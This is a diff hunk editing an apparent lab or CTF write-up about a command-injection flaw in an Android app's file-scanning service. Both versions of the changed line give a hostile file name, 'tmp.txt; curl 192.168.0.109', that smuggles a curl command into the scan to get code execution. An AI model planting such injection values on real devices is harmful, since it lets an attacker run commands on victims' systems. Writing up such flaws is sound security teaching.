@@ -374,7 +374,7 @@ Herein lies a critical discovery: within the `scanFile` function, there exists a
 
 ### Exploiting the Application
 
-To exploit this vulnerability, simply activate the service by toggling the switch. The service will commence scanning through files. All that's required is to have a file on the device named `tmp.txt; curl http://192.168.0.109`, triggering the desired code execution.
+To exploit this vulnerability, simply activate the service by toggling the switch. The service will commence scanning through files. All that's required is to have a file on the device named `tmp.txt; curl 192.168.0.109`, triggering the desired code execution.
 
 Start the server:
 
